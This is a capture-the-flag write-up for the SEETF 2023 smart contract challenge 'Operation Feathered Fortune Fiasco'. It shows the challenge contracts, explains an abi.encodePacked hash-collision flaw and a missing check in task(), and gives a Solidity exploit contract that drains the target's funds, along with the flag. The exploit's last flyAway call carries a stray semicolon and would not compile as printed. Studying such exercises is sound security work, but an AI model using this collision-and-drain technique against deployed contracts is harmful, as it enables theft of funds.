---
title: Blockchain - Operation Feathered Fortune Fiasco
description: 2023 | SEETF | Smart Contracts
tags:
    - smart contract
    - abi.encodePacked
    - collisions
---

## 题目

In the dystopian digital landscape of the near future, a cunning mastermind has kickstarted his plan for ultimate dominance by creating an army of robotic pigeons. These pigeons, six in the beginning, are given a sinister mission: to spy on the public, their focus being on individuals amassing significant Ethereum (ETH) holdings.

Each pigeon has been tasked with documenting the ETH each person owns, planning for a future operation to swoop in and siphon off these digital assets. The robotic pigeons, however, are not just spies, but also consumers. They are provided with ETH by their creator to cover their operational expenses, making the network of spy birds self-sustaining and increasingly dangerous.

The army operates on a merit-based system, where the pigeon agents earn points for their successful missions. These points pave their path towards promotion, allowing them to ascend the ranks of the robotic army. But, the journey up isn't free. They must return the earned ETH back to their master for their promotion.

Despite the regimented system, the robotic pigeons have a choice. They can choose to desert the army at any point, taking with them the ETH they've earned. Will they remain loyal, or will they break free?

> nc win.the.seetf.sg 8548

??? note "Setup.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.17;

    import "./Pigeon.sol";

    contract Setup {
        Pigeon public immutable pigeon;

        constructor() payable {
            pigeon = new Pigeon();

            // Junior Pigeons
            pigeon.assignPigeon("Numbuh", "6", address(0x006), 0);
            pigeon.assignPigeon{value: 5e18}("Numbuh", "5", address(0x005), 0);

            pigeon.assignPigeon("Numbuh", "4", address(0x004), 1);
            pigeon.assignPigeon{value: 10e18}("Numbuh", "3", address(0x003), 1);

            pigeon.assignPigeon("Numbuh", "2", address(0x002), 2);
            pigeon.assignPigeon{value: 15e18}("Numbuh", "1", address(0x001), 2);
        }

        receive() external payable {}

        function isSolved() external view returns (bool) {
            return address(msg.sender).balance >= 34 ether && address(pigeon).balance == 0 ether;
        }
    }
    ```

??? note "Pigeon.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.17;

    contract Pigeon {
        address private owner;
        uint256 private ownerBalance;
        uint256 private juniorPromotion;
        uint256 private associatePromotion;

        mapping(bytes32 => address) private seniorPigeon;
        mapping(bytes32 => address) private associatePigeon;
        mapping(bytes32 => address) private juniorPigeon;
        mapping(address => bool) private isPigeon;
        mapping(string => mapping(string => bool)) private codeToName;
        mapping(bytes32 => uint256) private taskPoints;

        mapping(address => mapping(address => uint256)) private dataCollection;
        mapping(address => bool) private hasBeenCollected;
        mapping(bytes32 => uint256) private treasury;

        modifier onlyOwner() {
            if (owner != msg.sender) revert();
            _;
        }

        modifier oneOfUs() {
            if (!isPigeon[msg.sender]) revert();
            _;
        }

        constructor() {
            owner = msg.sender;
            juniorPromotion = 8e18;
            associatePromotion = 12e18;
        }

        function becomeAPigeon(string memory code, string memory name) public returns (bytes32 codeName) {
            codeName = keccak256(abi.encodePacked(code, name));

            if (codeToName[code][name]) revert();
            if (isPigeon[msg.sender]) revert();

            juniorPigeon[codeName] = msg.sender;
            isPigeon[msg.sender] = true;
            codeToName[code][name] = true;

            return codeName;
        }

        function task(bytes32 codeName, address person, uint256 data) public oneOfUs {
            if (person == address(0)) revert();
            if (isPigeon[person]) revert();
            if (address(person).balance != data) revert();

            uint256 points = data;

            hasBeenCollected[person] = true;
            dataCollection[msg.sender][person] = points;
            taskPoints[codeName] += points;
        }

        function flyAway(bytes32 codeName, uint256 rank) public oneOfUs {
            uint256 bag = treasury[codeName];
            treasury[codeName] = 0;

            if (rank == 0) {
                if (taskPoints[codeName] > juniorPromotion) revert();

                (bool success,) = juniorPigeon[codeName].call{value: bag}("");
                require(success, "Transfer failed.");
            }
            if (rank == 1) {
                if (taskPoints[codeName] > associatePromotion) revert();

                (bool success,) = associatePigeon[codeName].call{value: bag}("");
                require(success, "Transfer failed.");
            }
            if (rank == 2) {
                (bool success,) = seniorPigeon[codeName].call{value: bag}("");
                require(success, "Transfer failed.");
            }
        }

        function promotion(bytes32 codeName, uint256 desiredRank, string memory newCode, string memory newName)
            public
            oneOfUs
        {
            if (desiredRank == 1) {
                if (msg.sender != juniorPigeon[codeName]) revert();
                if (taskPoints[codeName] < juniorPromotion) revert();
                ownerBalance += treasury[codeName];

                bytes32 newCodeName = keccak256(abi.encodePacked(newCode, newName));

                if (codeToName[newCode][newName]) revert();
                associatePigeon[newCodeName] = msg.sender;
                codeToName[newCode][newName] = true;
                taskPoints[codeName] = 0;
                delete juniorPigeon[codeName];

                (bool success,) = owner.call{value: treasury[codeName]}("");
                require(success, "Transfer failed.");
            }

            if (desiredRank == 2) {
                if (msg.sender != associatePigeon[codeName]) revert();
                if (taskPoints[codeName] < associatePromotion) revert();
                ownerBalance += treasury[codeName];

                bytes32 newCodeName = keccak256(abi.encodePacked(newCode, newName));

                if (codeToName[newCode][newName]) revert();
                seniorPigeon[newCodeName] = msg.sender;
                codeToName[newCode][newName] = true;
                taskPoints[codeName] = 0;
                delete seniorPigeon[codeName];

                (bool success,) = owner.call{value: treasury[codeName]}("");
                require(success, "Transfer failed.");
            }
        }

        function assignPigeon(string memory code, string memory name, address pigeon, uint256 rank)
            external
            payable
            onlyOwner
        {
            bytes32 codeName = keccak256(abi.encodePacked(code, name));

            if (rank == 0) {
                juniorPigeon[codeName] = pigeon;
                treasury[codeName] = msg.value;
                juniorPigeon[codeName] = pigeon;
                isPigeon[pigeon] = true;
                codeToName[code][name] = true;
            }

            if (rank == 1) {
                associatePigeon[codeName] = pigeon;
                treasury[codeName] = msg.value;
                associatePigeon[codeName] = pigeon;
                isPigeon[pigeon] = true;
                codeToName[code][name] = true;
            }

            if (rank == 2) {
                seniorPigeon[codeName] = pigeon;
                treasury[codeName] = msg.value;
                seniorPigeon[codeName] = pigeon;
                isPigeon[pigeon] = true;
                codeToName[code][name] = true;
            }
        }

        function exit() public onlyOwner {
            (bool success,) = owner.call{value: ownerBalance}("");
            require(success, "Transfer failed.");
        }
    }
    ```

## 解题思路

- 目标是清空 Pigeon 的余额，使得攻击者持有不少于 34 ether（初始为 5 ether）
- `Pigeon.flyAway()` 可以获得 `treasury[codeName]` 数量的 ether
- 漏洞点在于 `code` 和 `name` 均为动态类型 `string`，因此有 `abi.encodePacked("a", "bc") == abi.encodePacked("ab", "c")`，同时 `codeName = keccak256(abi.encodePacked(code, name))`，从而可以冒领其它 Pigeon 的 `treasury`
- 可以先调用 `Pigeon.becomeAPigeon()`，`flyAway()` 获得 5 ether
- 随后，调用 `Pigeon.task()` 增加 `taskPoints` 以通过 `Pigeon.promotion()` 晋级，从而能冒领下一等级 Pigeon 的 `treasury`
    - `task()` 需要提供一个不是 Pigeon 的地址，`taskPoints` 增加的值取决于指定地址的余额。尽管有 `hasBeenCollected` 的记录，但并没有对其进行检查，因此使用 `Pigeon` 实例的地址即可

### Exploit

```js
pragma solidity 0.8.17;

interface IPigeon {
    function becomeAPigeon(string memory, string memory) external returns (bytes32);
    function task(bytes32, address, uint256) external;
    function promotion(bytes32, uint256, string memory, string memory) external;
    function flyAway(bytes32, uint256) external;
}

contract Hack {
    function exploit(address instance) external {
        IPigeon pigeon = IPigeon(instance);
        bytes32 codeName = keccak256(abi.encodePacked("Numbuh5"));
        pigeon.becomeAPigeon("Numbu", "h5");
        pigeon.flyAway(codeName, 0);
        pigeon.task(codeName, instance, instance.balance);
        pigeon.promotion(codeName, 1, "Numbu", "h3");

        codeName = keccak256(abi.encodePacked("Numbuh3"));
        pigeon.flyAway(codeName, 1);
        pigeon.task(codeName, instance, instance.balance);
        pigeon.promotion(codeName, 2, "Numbu", "h1");

        pigeon.flyAway(keccak256(abi.encodePacked("Numbuh1"));, 2);
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
```

### Flag

> SEE{c00_c00_5py_squ4d_1n_act10n_9fbd82843dced19ebb7ee530b540bf93}